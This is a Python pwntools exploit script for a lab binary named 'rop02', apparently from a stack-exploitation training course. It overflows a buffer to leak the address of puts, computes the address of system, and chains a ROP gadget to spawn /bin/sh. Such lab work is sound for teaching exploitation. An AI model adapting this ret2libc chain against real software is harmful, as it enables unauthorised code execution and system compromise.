#!/usr/bin/env python2
# encoding: utf-8

from pwn import *
import time
#ev check
LOCAL =True
GDB= True
STRACE=False

elf = ELF("./rop02")

context.update(binary=elf)
context(log_level='debug')

if LOCAL:
    libc = elf.libc
    r = process(elf.path)
else:
    libc = ELF("libc.so")
    r = remote("localhost", 1337)

l = listen(1338)

def debug(cmd=''):
    if GDB :
        context.terminal=["tmux",'splitw','-v','-h','-l','100']
        pie_base, glibc_base = r.libs()[elf.path], r.libs()[libc.path]
        gdb.attach(r.proc.pid, cmd + """\nc""")
    if STRACE :
        run_in_new_terminal("strace -ff -p %d" % r.proc.pid)

#bp
debug('b *0x0000000000400849')


#stage 1 -- leak--------------------
r.recvuntil("What is your name?\n> ")
r.sendline("/bin/sh\00")

r.recvuntil("What is your quest?\n> ")
r.sendline("B")

rop=ROP("/home/formation/labs/stack/rop02/rop02")


rop.puts(elf.got['puts'])  #leak
rop.raw(p64(0x40078C))
payload = flat(
            "a" *120,
            str(rop)
             )



r.recvuntil("What is the air-speed velocity of an unladen swallow?\n> ")
r.sendline(payload)
r.recvuntil("What? I don't know that! Auuuuuuuugh!\n")
sleep(0.1)


#------leak-------------
# pack/unpack with p32/u32/p64/u64 (pad to 4 or 8 bytes)
leak_puts = u64(r.readuntil("\n", drop=True)[:8].ljust(8, '\x00'))
log.success('libc_puts: @ %#x' % leak_puts)
offset=(libc.symbols['puts']-libc.symbols['system'])
log.success('offset: @ %#x' % offset)
system=leak_puts-offset
log.success('libc_system: @ %#x' % system)

#-----stage2--------------
r.recvuntil("What is your name?\n> ")
time.sleep(0.1)
r.sendline("/bin/sh\00")    #bss


r.recvuntil("What is your quest?\n> ")
time.sleep(0.1)
r.sendline("hello")

poprdi=0x4008d3
bss=0x601080
rop2=ROP("/home/formation/labs/stack/rop02/rop02")
payload2=flat(

"A"*112,
"B"*8,
poprdi,
bss,
system,
endianness='little',word_size=64,sign=False
)
r.recvuntil("What is the air-speed velocity of an unladen swallow?\n> ")
time.sleep(0.1)
r.sendline(payload2)

r.interactive()


